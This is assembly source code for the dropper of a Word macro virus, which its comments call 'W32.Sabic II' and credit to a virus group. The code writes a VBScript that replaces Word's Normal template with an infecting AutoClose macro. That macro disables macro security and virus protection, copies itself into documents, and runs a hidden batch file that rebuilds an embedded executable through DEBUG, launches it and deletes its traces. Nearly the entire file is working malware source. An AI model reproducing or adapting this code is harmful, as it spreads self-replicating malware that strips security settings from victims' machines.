; Компилировать с помощью Tasm32 v5.0r
;
;  tasm32 -m -ml bin2scr.asm
;  tlink32 -Tpe -x bin2scr.obj,,,import32.lib
;  del bin2scr.obj



   .386
   .model flat

extrn		_lcreat:proc
extrn		_lopen:proc
extrn		_lread:proc
extrn		_lwrite:proc
extrn		_llseek:proc
extrn		_lclose:proc
extrn		GetWindowsDirectoryA:proc
extrn		lstrcat:proc



   .data

   script_		db 'On Error Resume Next',0dh,0ah
			db 'Dim WR',0dh,0ah
			db 'Set WR = WScript.CreateObject("Word.Application")',0dh,0ah
			db 'Set NT = WR.NormalTemplate.VBProject.VBComponents("ThisDocument").CodeModule',0dh,0ah
			db 'WR.Options.SaveNormalPrompt = False',0dh,0ah
			db 'NT.DeleteLines 1, NT.CountOfLines',0dh,0ah
			db 'NT.InsertLines 1, "Sub AutoClose()"',0dh,0ah
			db 'NT.InsertLines 2, "On Error Resume Next"',0dh,0ah
			db 'NT.InsertLines 3, "rem W32.Sabiс II"',0dh,0ah
			db 'NT.InsertLines 4, "rem Coded by NBK & ULTRAS / MATRiX"',0dh,0ah
			db 'NT.InsertLines 5, "If Application.Version = ""9.0"" Then"',0dh,0ah
			db 'NT.InsertLines 6, "If System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"", ""Level"") <> """" Then"',0dh,0ah
			db 'NT.InsertLines 7, "CommandBars(""Macro"").Controls(""Security..."").Enabled = False"',0dh,0ah
			db 'NT.InsertLines 8, "System.PrivateProfileString("""", ""HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"", ""Level"") = 1&"',0dh,0ah
			db 'NT.InsertLines 9, "Else"',0dh,0ah
			db 'NT.InsertLines 10, "CommandBars(""Tools"").Controls(""Macro"").Enabled = False"',0dh,0ah
			db 'NT.InsertLines 11, "Options.VirusProtection = (1 - 1)"',0dh,0ah
			db 'NT.InsertLines 12, "Options.SaveNormalPrompt = (1 - 1)"',0dh,0ah
			db 'NT.InsertLines 13, "End If"',0dh,0ah
			db 'NT.InsertLines 14, "ultra = Environ(""windir"")"',0dh,0ah
			db 'NT.InsertLines 15, "NormalTemplate.VBProject.VBComponents(""ThisDocument"").Name = ""SII"""',0dh,0ah
			db 'NT.InsertLines 16, "Application.VBE.ActiveVBProject.VBComponents(""SII"").Export ultra & ""\"" & Application.UserName & "".dll"""',0dh,0ah
			db 'NT.InsertLines 17, "For U = 1 To NormalTemplate.VBProject.VBComponents.Count"',0dh,0ah
			db 'NT.InsertLines 18, "If NormalTemplate.VBProject.VBComponents(U).Name = ""SII"" Then NormalInfect = True"',0dh,0ah
			db 'NT.InsertLines 19, "Next U"',0dh,0ah
			db 'NT.InsertLines 20, "For N = 1 To ActiveDocument.VBProject.VBComponents.Count"',0dh,0ah
			db 'NT.InsertLines 21, "If ActiveDocument.VBProject.VBComponents(N).Name = ""SII"" Then ActiveInfect = True"',0dh,0ah
			db 'NT.InsertLines 22, "Next N"',0dh,0ah
			db 'NT.InsertLines 23, "If ActiveInfect = True And NormalInfect = False Then Set nb = NormalTemplate.VBProject Else _"',0dh,0ah
			db 'NT.InsertLines 24, "If ActiveInfect = False And NormalInfect = True Then Set nb = ActiveDocument.VBProject"',0dh,0ah
			db 'NT.InsertLines 25, "nb.VBComponents.Import (ultra & ""\"" & Application.UserName & "".dll"")"',0dh,0ah
			db 'NT.InsertLines 26, "nb.VBComponents.Import (ultra & ""\"" & ""s2.dll"")"',0dh,0ah
			db 'NT.InsertLines 27, "Call Sii_Drop"',0dh,0ah
			db 'NT.InsertLines 28, "If ActiveInfect = False Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument"',0dh,0ah
			db 'NT.InsertLines 29, "End Sub"',0dh,0ah
			db 'WR.Run "Normal.ThisDocument.AutoExec"',0dh,0ah
			db 'WR.Quit',00h
   script_size		equ $-script_

   flz_handle           dd      ?

   vbsdropper      	db      '\kewl.vbs', 0		; %windir%\kewl.vbs (W0rd Infector module via VBS)
   szvbs		db 	260 dup (0)

   bindropper      	db      '\s2.dll', 0		; %windir%\kewl.vbs (Virus Debug Script)
   szbin		db 	260 dup (0)

   mtxdropper      	db      '\sabia.exe', 0		; here original SII file!!!!!
   szmtx		db 	260 dup (0)

   FName1		db	'NBK_ULTRAS.EXE',0
   string1		db	' ##'
   string@1_s		equ	$-string1
   string@1_p		equ	1
   string2		db	'Sub Sii_Drop()',0Dh,0Ah
			db	'On error resume next',0Dh,0Ah
			db	'OPEN "C:\SABiA.SRC" FOR OUTPUT AS #1',0Dh,0Ah
			db	'PRINT #1, "N C:\SII.EX'
			
   string@2_s		equ	$-string2
   string3		db	'"',0Dh,0Ah,'PRINT #1, "E ####'
   string@3_s		equ	$-string3
   string@3_p		equ	16
   string4		db	'"',0Dh,0Ah
			db	'PRINT #1, "RCX"',0Dh,0Ah
			db	'PRINT #1, "####"',0Dh,0Ah
			db	'PRINT #1, "W"',0Dh,0Ah
			db	'PRINT #1, "Q"',0Dh,0Ah
			db	'CLOSE #1',0Dh,0Ah
   string@4_s		equ	$-string4
   string@4_p		equ	31
   BytesPerLine		equ	10h

   string5		db 'OPEN "C:\SII.BAT" FOR OUTPUT AS #2',0Dh,0Ah
			db 'PRINT #2,"@ECHO OFF"', 0Dh,0Ah
			db 'PRINT #2,"DEBUG <C:\SABiA.SRC >NUL"', 0Dh,0Ah
			db 'PRINT #2,"COPY C:\SII.EX C:\SABiAII.EXE >NUL"', 0Dh,0Ah
			db 'PRINT #2,"C:\SABiAII.EXE"', 0Dh,0Ah
			db 'PRINT #2,"DEL C:\SII.EX >NUL"', 0Dh,0Ah
			db 'PRINT #2,"DEL C:\SABiA.SRC >NUL"', 0Dh,0Ah
			db 'PRINT #2,"DEL C:\SABiAII.EXE >NUL"', 0Dh,0Ah
			db 'PRINT #2,"DEL C:\SII.BAT >NUL"', 0Dh,0Ah
			db 'CLOSE #2', 0Dh,0Ah
			db 'SHELL "C:\SII.BAT", VBHIDE', 0Dh,0Ah
			db 'End Sub', 0Dh,0Ah
   string@5_s		equ $-string5




   .code

start:

   push 260
   push offset szvbs
   call GetWindowsDirectoryA

   push offset vbsdropper
   push offset szvbs
   call lstrcat

   push	0
   push	offset szvbs
   call	_lcreat
   mov  [flz_handle],eax

   push	script_size
   push	offset script_
   push	[flz_handle]
   call	_lwrite

   push	[flz_handle]
   call	_lclose

create_dropper:
   pushad

   ;push 260
   ;push offset szmtx
   ;call GetWindowsDirectoryA

   ;push offset mtxdropper
   ;push offset szmtx
   ;call lstrcat

   push	0
   ;push offset szmtx
   push	offset FName1
   call	_lopen
   cmp eax, -1
   je exit
   xchg	edi, eax

   push 260
   push offset szbin
   call GetWindowsDirectoryA

   push offset bindropper
   push offset szbin
   call lstrcat

   push	0
   push	offset szbin
   call	_lcreat
   cmp eax,-1
   je exit
   xchg	esi,eax

   push	string@2_s
   push	offset string2
   push	esi
   call	_lwrite

   mov ebp,100h
startx:		
   mov ebx,ebp
   call	Bin2Hex
   mov dword ptr [string3+string@3_p], edx

   push	string@3_s
   push	offset string3
   push	esi
   call	_lwrite

   mov ecx,BytesPerLine
second:
   push	ecx

   push	1
   push	offset string1+string@1_p
   push	edi
   call	_lread
   or eax,eax
   jz endz

   xor ebx,ebx
   mov bh,[string1+string@1_p]
   call	Bin2Hex
   mov word ptr [string1+string@1_p], dx

   push	string@1_s
   push	offset string1
   push	esi
   call	_lwrite

   pop ecx
   loop	second

   add ebp,BytesPerLine
   jmp startx

endz:		
   pop ecx
   cmp ecx,BytesPerLine
   jne zapish

   push	ecx
   push	1
   push	-string@3_s
   push	esi
   call	_llseek
   pop ecx

zapish:		
   neg ecx
   lea ebx,[(ebp-100h)+(BytesPerLine+ecx)]
   call	Bin2Hex
   mov dword ptr [string4+string@4_p],edx
   push	string@4_s
   push	offset string4
   push	esi
   call	_lwrite

   push	string@5_s
   push	offset string5
   push	esi
   call	_lwrite

   push	edi
   call	_lclose

   push	esi
   call	_lclose

exit:	
   popad
   ret

Bin2Hex:	
   mov ecx,4
   xor edx,edx
@3:		
   mov al,bl
   shr ebx,4
   and al,00001111b
   cmp al,0Ah
   jb @1
   add al,'A'-'9'-1
@1:		
   add al,'0'
   shl edx,8
   mov dl,al
   loop	@3
   ret

   end	start
